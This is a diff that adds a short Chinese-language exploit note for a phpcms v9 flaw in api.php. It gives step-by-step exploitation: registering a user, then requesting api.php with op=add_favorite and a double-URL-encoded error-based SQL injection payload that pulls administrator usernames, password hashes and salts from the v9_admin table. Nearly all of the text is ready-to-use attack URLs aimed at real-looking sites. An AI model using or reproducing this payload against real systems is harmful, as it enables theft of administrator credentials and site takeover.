@@ -1,0 +1,10 @@
+phpcms v9最新爆管理密码漏洞
+
+漏洞形成原因就不多说了，文件在phpcms/api.php ，有兴趣的盆友可以多去挖一挖phpcms的洞子。
+主要利用过程：
+第一步：注册一个用户
+http://www.sbmonkey.com/index.php?m=member&c=index&a=register&siteid=1
+第二步：访问api文件，爆出表前缀，默认的表前缀为v9
+http://www.sbmonkey.com/api.php?op=add_favorite&url=wooyun.in&title=%2527
+
+http://www.wooyun.in/api.php?op=add_favorite&url=v9&title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520v9_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271
